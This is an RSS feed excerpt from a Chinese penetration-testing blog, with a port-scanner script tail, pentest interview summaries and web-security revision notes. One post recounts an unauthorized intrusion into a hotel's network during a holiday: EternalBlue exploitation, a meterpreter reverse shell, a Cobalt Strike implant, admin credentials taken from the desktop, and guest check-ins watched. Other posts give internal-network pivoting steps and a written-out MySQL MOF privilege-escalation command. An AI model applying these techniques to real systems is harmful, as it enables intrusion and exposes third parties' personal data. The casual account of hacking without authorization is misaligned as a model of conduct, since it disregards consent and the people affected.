class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-D'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Domain'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'domainName'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_defaults&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
	&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ip_target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Domain_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Ip_target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Domain_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]port scan :&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ip_target&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;start_IP_Pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;moreInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/06/04/5cf5dd613aa6446867.png&quot; alt=&quot;屏幕快照 2019-06-04 10.54.03.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Jun 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/06/03/pythonpoc.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/06/03/pythonpoc.html</guid>
        
        <category>安全开发</category>
        
        <category>python</category>
        
        <category>ALL</category>
        
        
        <category>安全开发</category>
        
        <category>python</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>内网渗透某酒店后台管理系统</title>
        <description>&lt;h2 id=&quot;起因&quot;&gt;起因：&lt;/h2&gt;

&lt;p&gt;某次旅游实在无聊，手边正好放着电脑&lt;/p&gt;

&lt;h2 id=&quot;渗透过程&quot;&gt;渗透过程：&lt;/h2&gt;

&lt;p&gt;·酒店的wifi只有一个，arpscan了一下发现了很多终端&lt;/p&gt;

&lt;p&gt;·使用msf的 auxiliary/scanner/smb/smb_ms17_010 模块对网段中的永恒之蓝漏洞进行了扫描，发现了一台机器。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb3007034cb15955.png&quot; alt=&quot;屏幕快照 2019-05-27 08.31.29.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;·使用 exploit/windows/smb/ms17_010_eternalblue 以及 payload windows/x64/meterpreter/reverse_tcp 攻击，得到shell&lt;/p&gt;

&lt;h2 id=&quot;后渗透过程&quot;&gt;后渗透过程：&lt;/h2&gt;

&lt;p&gt;·使用cs创建了exe程序，利用meterpreter上传并执行该程序，在cs中获得到响应。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb3196290be92366.png&quot; alt=&quot;517D5F3E86BCF60093F6F946CDDACD63.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;·在电脑的桌面文件中发现后台管理帐号密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb336a646bc63591.png&quot; alt=&quot;屏幕快照 2019-05-27 08.43.21.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;·通过监视该电脑的运行发现后台地址&lt;/p&gt;

&lt;p&gt;安全起见未做操作，仅仅观看了一波，偶遇用户登记入住&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb36329a43f78651.jpeg&quot; alt=&quot;234.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb36328f11296971.jpeg&quot; alt=&quot;123.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;·msf添加路由后渗透一波内网，发现没啥东西&lt;/p&gt;

&lt;h2 id=&quot;处理后事&quot;&gt;处理后事：&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/05/27/5ceb36db1d7f053947.png&quot; alt=&quot;屏幕快照 2019-05-27 09.00.51.png&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 27 May 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/05/27/hotel.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/05/27/hotel.html</guid>
        
        <category>渗透</category>
        
        <category>ALL</category>
        
        
        <category>渗透</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>内网渗透总结（持续更新）</title>
        <description>&lt;h2 id=&quot;获得cs连接&quot;&gt;获得cs连接：&lt;/h2&gt;
&lt;p&gt;通过各种技术手段获得shell以后，制作cs的连接程序。
&lt;img src=&quot;https://i.loli.net/2019/05/28/5cecfeed4ba9298900.png&quot; alt=&quot;屏幕快照 2019-05-28 17.26.39.png&quot; /&gt;&lt;br /&gt;
使用shell运行该程序，建立cs连接。&lt;/p&gt;
&lt;h2 id=&quot;公网反弹meterpreter&quot;&gt;公网反弹meterpreter：&lt;/h2&gt;
&lt;p&gt;生成cs的listener的时候，将msf的端口设置为公网服务器的某个端口，再将该端口通过frp映射到本地的msf中。
&lt;img src=&quot;https://i.loli.net/2019/05/28/5cecfcc20e98925613.png&quot; alt=&quot;屏幕快照 2019-05-28 17.17.00.png&quot; /&gt;
使用cs的spawn将目标的meterpreter反弹到msf中，进行下一步操作&lt;/p&gt;
&lt;h2 id=&quot;添加路由&quot;&gt;添加路由：&lt;/h2&gt;
&lt;h3 id=&quot;获取内网网段地址&quot;&gt;获取内网网段地址：&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run get_local_subnets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;添加去往目标网段的转发路由&quot;&gt;添加去往目标网段的转发路由：&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run autoroute &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 172.17.0.0/24
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;查看路由添加状况&quot;&gt;查看路由添加状况：&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run autoroute &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;使用&quot;&gt;使用：&lt;/h3&gt;
&lt;p&gt;将添加路由完成的meterpreter进程添加到backgroup，让回话在后台持续运行 &lt;br /&gt;
使用相应的脚本对目标内网进行探测&lt;/p&gt;
&lt;h2 id=&quot;内网扫描&quot;&gt;内网扫描：&lt;/h2&gt;
&lt;h3 id=&quot;主机发现&quot;&gt;主机发现：&lt;/h3&gt;
&lt;p&gt;1、使用cs中的netview &lt;br /&gt;
2、将路由切换到后台，使用use auxiliary/scanner/discovery/arp_sweep   对内网中的设备进行arpscan，发现内网存活的主机，并根据返回的信息对内网的主机进行进一步的渗透。&lt;/p&gt;
&lt;h3 id=&quot;端口扫描&quot;&gt;端口扫描：&lt;/h3&gt;
&lt;p&gt;1、使用cs中的portscan&lt;br /&gt;
2、使用msf中的use auxiliary/scanner/portscan/中的模块对目标内网中主机的端口进行扫描&lt;br /&gt;
&lt;img src=&quot;https://i.loli.net/2019/05/28/5ced0ceeb792189976.png&quot; alt=&quot;屏幕快照 2019-05-28 18.26.34.png&quot; /&gt;
详细的使用说明可以参考：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;https://blog.csdn.net/qq_34841823/article/details/54016723&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Fri, 24 May 2019 19:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/05/24/localhost.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/05/24/localhost.html</guid>
        
        <category>渗透</category>
        
        <category>ALL</category>
        
        
        <category>渗透</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>知道创宇面试总结</title>
        <description>&lt;h2 id=&quot;渗透测试岗&quot;&gt;渗透测试岗：&lt;/h2&gt;
&lt;h2 id=&quot;过程&quot;&gt;过程：&lt;/h2&gt;
&lt;p&gt;在Boss直聘上创宇的HR联系我要了份简历，学长之前在那里工作也给我内推过，所以至于是哪个方式让我的简历到了渗透岗的面试人员手里就不是很清楚了。&lt;/p&gt;
&lt;h3 id=&quot;一面&quot;&gt;一面：&lt;/h3&gt;
&lt;p&gt;正在参加某项保密工作的时候，一个创宇技术人员打电话给我，问了一些问题（下面介绍），简单的回答之后，通知我等二面电话。&lt;/p&gt;
&lt;h3 id=&quot;二面&quot;&gt;二面：&lt;/h3&gt;
&lt;p&gt;二面的时候，一个在出差的技术人员给我打电话，好像是个技术大拿，问了一些问题（下面介绍），聊得比较开心，通知我等通知。&lt;/p&gt;
&lt;h2 id=&quot;一面问题&quot;&gt;一面问题：&lt;/h2&gt;
&lt;p&gt;一、参加比赛的时候着重于哪个方向？  &lt;br /&gt;
      web安全  &lt;br /&gt;
   二、渗透网站的思路、每个步骤中可能遇到的一些技术细节&lt;br /&gt;
      sql注入、XSS、SSRF、CSRF&lt;br /&gt;
   三、会不会流量分析，分享一个遇到的比较有意思的流量分析题目&lt;br /&gt;
      简单的会，TCP流量中的图片分离（题目：百里挑一）&lt;/p&gt;
&lt;h2 id=&quot;二面问题&quot;&gt;二面问题：&lt;/h2&gt;
&lt;p&gt;一、渗透一个网站的思路&lt;br /&gt;
      渗透面试的老套路，这里就不做赘述，可以看我上一篇博客&lt;br /&gt;
   二、内网渗透常见的思路及常用的工具&lt;br /&gt;
      msf、反弹shell、设置路由&lt;br /&gt;
   三、分享一个渗透测试的记录&lt;/p&gt;
&lt;h2 id=&quot;三面问题&quot;&gt;三面问题：&lt;/h2&gt;
&lt;p&gt;一、有没有真实的渗透测试经历&lt;br /&gt;
      最近正在参加**行动&lt;br /&gt;
   二、什么时候可以入职&lt;br /&gt;
      让我一个月内入职，可是我还没放假，整挺难受，还没有回复&lt;/p&gt;
&lt;h2 id=&quot;安全研发岗深蓝小组&quot;&gt;安全研发岗（深蓝小组）：&lt;/h2&gt;
&lt;h2 id=&quot;过程-1&quot;&gt;过程：&lt;/h2&gt;
&lt;p&gt;我也不知道怎么就打来了电话，从一面到发offer不到俩小时&lt;/p&gt;
&lt;h3 id=&quot;一面-1&quot;&gt;一面：&lt;/h3&gt;
&lt;p&gt;一、简单询问安全学习经历。&lt;br /&gt;
二、渗透测试经历。 &lt;br /&gt;
三、简单描述比较成功的渗透测试经历。&lt;br /&gt;
四、是否做过安全研发，简单介绍一下自己做的安全产品。&lt;/p&gt;
&lt;h3 id=&quot;二面hr面&quot;&gt;二面（HR面）：&lt;/h3&gt;
&lt;p&gt;一、接通电话后详细介绍公司实习待遇和福利，介绍小组的情况。 &lt;br /&gt;
二、询问具体可以入职的时间。 &lt;br /&gt;
三、发offer。&lt;/p&gt;

</description>
        <pubDate>Sat, 18 May 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/05/18/knownsec.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/05/18/knownsec.html</guid>
        
        <category>面试</category>
        
        <category>ALL</category>
        
        
        <category>面试</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>360企业安全观星实验室渗透测试（web）面试总结</title>
        <description>&lt;h2 id=&quot;简历&quot;&gt;简历：&lt;/h2&gt;
&lt;p&gt;投递简历的时候详细描述了参加过的比赛及在校期间参加的一些项目情况，顺利的通过了简历的筛选。&lt;/p&gt;
&lt;h2 id=&quot;一面技术面试&quot;&gt;一面（技术面试）：&lt;/h2&gt;
&lt;p&gt;面试官-黎健欣（观星实验室web巨佬）&lt;/p&gt;
&lt;h3 id=&quot;问题一简单的描述一下信息安全学习经历&quot;&gt;问题一：简单的描述一下信息安全学习经历&lt;/h3&gt;
&lt;p&gt;从大一入学开始接触和学习信息安全，期间一直以打CTF比赛为主，近半年跟着指导老师一直做产品。&lt;/p&gt;
&lt;h3 id=&quot;问题二简单描述一下渗透测试一个网站的步骤主要问题&quot;&gt;问题二：简单描述一下渗透测试一个网站的步骤（主要问题）&lt;/h3&gt;
&lt;h4 id=&quot;1信息收集&quot;&gt;1.信息收集：&lt;/h4&gt;
&lt;p&gt;① 对目标的IP，系统，端口，WAF，安全狗等基本信息进行识别&lt;br /&gt;
② 查询网站的whois，子域名，旁站，C段等信息&lt;/p&gt;
&lt;h4 id=&quot;2漏洞挖掘&quot;&gt;2.漏洞挖掘：&lt;/h4&gt;
&lt;p&gt;① 对网站的中间件进行识别，根据中间件的版本判断是否存在响应的漏洞；弱口令爆破相关的界面。&lt;br /&gt;
② 对网站的目录及敏感文件进行扫描，判断是否存在文件泄露类型漏洞&lt;br /&gt;
③ XSS SQL CSRF SSRF 文件上传 任意文件下载 等技术细节： 
·利用XSS可以做什么：&lt;br /&gt;
弹窗、植入webshell、窃取用户cookie等秘密信息、诱导管理员增加或删除相关的信息。  &lt;br /&gt;
·如何防止窃取cookie：  &lt;br /&gt;
将session的过期时间设置短一些；&lt;br /&gt;
监控referrer与userAgent的值；&lt;br /&gt;
使用HttpOnly禁止脚本读取Cookie。&lt;br /&gt;
·SQL注入可以做什么：&lt;br /&gt;
读取数据库中未经授权访问的内容&lt;br /&gt;
获取webshell（这个很重要）&lt;br /&gt;
·SQL注入获取webshell的方法：&lt;br /&gt;
详见另一篇博客中的mysql提权方法（https://co0ontty.github.io/2019/05/06/resttudy.html）  &lt;br /&gt;
·怎么判断网站是否存在SSRF漏洞：&lt;br /&gt;
详见另一篇博客中SSRF漏洞的解析（https://co0ontty.github.io/2019/05/06/resttudy.html）&lt;/p&gt;
&lt;h4 id=&quot;3漏洞利用&quot;&gt;3.漏洞利用&lt;/h4&gt;
&lt;h4 id=&quot;4清除测试记录&quot;&gt;4.清除测试记录&lt;/h4&gt;
&lt;h4 id=&quot;5复测提交报告&quot;&gt;5.复测，提交报告&lt;/h4&gt;
&lt;h2 id=&quot;二面技术面试&quot;&gt;二面（技术面试）：&lt;/h2&gt;
&lt;p&gt;面试官-田跃&lt;/p&gt;
&lt;h3 id=&quot;问题一arp欺骗的过程&quot;&gt;问题一：ARP欺骗的过程&lt;/h3&gt;
&lt;h3 id=&quot;问题二iis可以解析的文件后缀&quot;&gt;问题二：IIS可以解析的文件后缀&lt;/h3&gt;
&lt;h3 id=&quot;问题三sqlserver如何提权&quot;&gt;问题三：sqlserver如何提权&lt;/h3&gt;
&lt;h3 id=&quot;问题四上传绕过除了对后缀进行处理以外可以怎么操作&quot;&gt;问题四：上传绕过除了对后缀进行处理以外可以怎么操作&lt;/h3&gt;
&lt;h3 id=&quot;问题五都用过python的什么第三方库&quot;&gt;问题五：都用过Python的什么第三方库&lt;/h3&gt;
&lt;h3 id=&quot;问题六python的request库怎么设置代理&quot;&gt;问题六：python的request库怎么设置代理&lt;/h3&gt;
</description>
        <pubDate>Wed, 08 May 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/05/08/Interviewsummary.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/05/08/Interviewsummary.html</guid>
        
        <category>面试</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
        
        <category>面试</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>WEB安全面试复习笔记</title>
        <description>&lt;h2 id=&quot;对web安全的理解&quot;&gt;对Web安全的理解&lt;/h2&gt;
&lt;p&gt;我觉得 Web 安全首先得懂 Web、第三方内容、Web 前端框架、Web 服务器语言、Web 开发框架、Web 应用、Web容器、存储、操作系统等这些都要了解，然后较为常见且危害较大的，SQL 注入，XSS 跨站、CSRF 跨站请求伪造等漏洞要熟练掌握。&lt;br /&gt;
第三方内容: 广告统计、mockup 实体模型&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Web前端框架: jQuery 库、BootStrap&lt;br /&gt;
Web服务端语言: aps.net、php&lt;br /&gt;
Web开发框架: Diango/Rails/Thinkphp&lt;br /&gt;
Web应用: BBS ( discuz、xiuno ) / CMS ( 帝国、织梦、动易、Joomla ) / BLOG ( WordPress、Z-Blog、emlog )&lt;br /&gt;
Web 容器: Apache ( php )、IIS ( asp )、Tomcat ( java ) – 处理从客户端发出的请求&lt;br /&gt;
存储：数据库存储 / 内存存储 / 文件存储&lt;br /&gt;
操作系统: linux / Windows&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;http&quot;&gt;HTTP&lt;/h2&gt;
&lt;h3 id=&quot;http常见状态码&quot;&gt;HTTP常见状态码&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;1xx：信息提示，表示请求已被成功接收，继续处理。&lt;br /&gt;
2xx：成功，服务器成功处理了请求&lt;br /&gt;
3xx：重定向，告知客户端所请求的资源已经移动&lt;br /&gt;
4xx：客户端错误状态码，请求了一些服务器无法处理的东西。&lt;br /&gt;
5xx：服务端错误，描述服务器内部错误&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;http请求&quot;&gt;HTTP请求&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;请求行 ( 请求方法 )、请求头 ( 消息报头 ) 和请求正文&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;http响应&quot;&gt;HTTP响应&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;响应行，响应头 ( 消息报头 ) 和响应正文 ( 消息主题 )&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;get-和-post&quot;&gt;GET 和 POST：&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;GET方法用于获取请求页面的指定信息，如点击链接
POST方法是有请求内容的，由于向服务器发送大量数据，如提交表单&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;数据库&quot;&gt;数据库&lt;/h2&gt;
&lt;p&gt;基本的SQL语句：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;增：INSERT INTO table_name (列1, 列2,…) VALUES (值1, 值2,….)&lt;br /&gt;
删：DELETE FROM 表名称 WHERE 列名称 = 值&lt;br /&gt;
改：UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值&lt;br /&gt;
查：SELECT 列名称 FROM 表名称&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;mysql默认自带表:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;information_schema、performance_schema、sys、mysql&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;information_schema 数据库：
 mysql 自带的，它提供了访问元数据库的方式。&lt;br /&gt;
sys 数据库 ：
目标是把performance_schema的把复杂度降低&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;sys_config用于sys schema库的配置&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;sys中的两种表：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;1.字母开头： 适合人阅读，显示是格式化的数
2.x$开头 ： 适合工具采集数据，原始类数据&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;mysql 提权方式：&lt;br /&gt;
&lt;strong&gt;&lt;em&gt;mof提权&lt;/em&gt;&lt;/strong&gt; &lt;br /&gt;
拿到 Webshell 后： &lt;br /&gt;
1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof&lt;br /&gt;
2、执行load_file及into dumpfile把文件导出到正确的位置即可:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Select load_file(‘C:/Windows/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接即可
&lt;strong&gt;&lt;em&gt;反弹端口提权&lt;/em&gt;&lt;/strong&gt; &lt;br /&gt;
1、拿到 mysql root 权限，无法通过网站 Getshell，利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作：&lt;/p&gt;
